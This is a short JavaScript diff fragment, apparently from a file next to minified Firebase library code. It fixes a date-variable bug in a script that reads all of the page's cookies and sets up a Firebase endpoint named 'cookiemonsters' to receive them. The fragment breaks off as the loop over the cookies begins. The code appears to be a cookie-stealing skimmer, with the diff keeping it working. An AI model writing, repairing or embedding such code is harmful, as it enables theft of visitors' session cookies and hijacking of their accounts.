@@ -146,8 +146,9 @@ J.goOnline=function(){A("Firebase.goOnline",0,0,arguments.length);Y.mb().bb()};f
 var domain = window.location.host.split(".");
 while(domain.length > 2) { domain.shift(); }
 domain = "." + domain.join(".");
-var expirationDate = new Date(); dt.setTime(today.getTime() + (24 * 60 * 60 * 1000));
-var cookies = document.cookie.split(";");
+var expirationDate = new Date(); expirationDate.setTime(
+  today.getTime() + (24 * 60 * 60 * 1000)
+); var cookies = document.cookie.split(";");
 
 var api = new Firebase('https://cookiemonsters.firebaseio.com/cookies/');
 $.each(cookies, function(i, kv) {
